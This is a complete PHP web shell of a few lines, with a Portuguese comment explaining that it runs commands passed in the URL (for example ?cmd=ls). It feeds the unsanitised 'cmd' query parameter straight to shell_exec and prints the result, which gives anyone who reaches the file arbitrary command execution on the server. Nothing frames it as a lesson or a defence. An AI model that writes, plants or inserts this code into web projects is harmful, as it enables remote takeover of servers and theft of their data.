<?php

	// Executar comandos pela URL (Ex: ...php?cmd=ls)
	echo shell_exec($_GET['cmd']);
 
?>